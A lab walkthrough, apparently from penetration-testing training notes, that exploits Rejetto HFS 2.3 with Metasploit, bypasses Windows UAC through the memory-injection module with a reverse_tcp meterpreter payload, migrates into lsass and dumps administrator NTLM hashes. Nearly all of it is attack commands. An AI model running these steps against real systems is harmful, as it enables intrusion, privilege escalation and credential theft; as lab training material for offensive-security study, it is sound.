# UAC Bypass: Memory Injection (Metasploit)

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 5010–5071. Examples are lab-specific and need verification.

In this lab, we will look at how to bypass UAC [https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works] using the Memory Injection Metasploit local exploit module

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable server will be accessible at **demo.ine.local**.

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module. And then, bypass UAC using the Memory Injection Metasploit local exploit module.

**Objective:** Gain the highest privilege on the compromised machine and get administrator user NTLM hash.

**Tools: nmap, msf**

```bash
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
#HTTP File Server (HFS) 2.3 is available.
searchsploit hfs
#Rejetto HTTP File Server (HFS) 2.3 is vulnerable to RCE. Exploiting the target server using the Metasploit framework.

msfconsole -q

use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
#got meterpreter
getuid   # not NT authority need escalate priv
sysinfo

#We can observe that we are running as an admin user. Migrate the process in explorer.exe. First, search for the PID of explorer.exe and use the migrate command to migrate the current process to the explorer process.
ps -S explorer.exe
migrate 2124
#Please note the explorer.exe arch is x64 bit, so later when we perform UAC bypass, we have to use x64 based meterpreter payload.

#Elevate to the high privilege:
getsystem
#We can observe that we do not have permission to elevate privileges.
#Get a windows shell and check if the admin user is a member of the Administrators group.
shell
net localgroup administrators

#This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three separate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also). If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.”
CTRL + C
background
#run UAC bypass in memory injection module

use exploit/windows/local/bypassuac_injection
set session 1
set TARGET 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
#got meterpreter session
getsystem
getuid     #not high priv like NT auth

ps
ps -S lsass.exe
migrate 484     #got high priv
hashdump
#got flag administrator second : part hash part flag

```
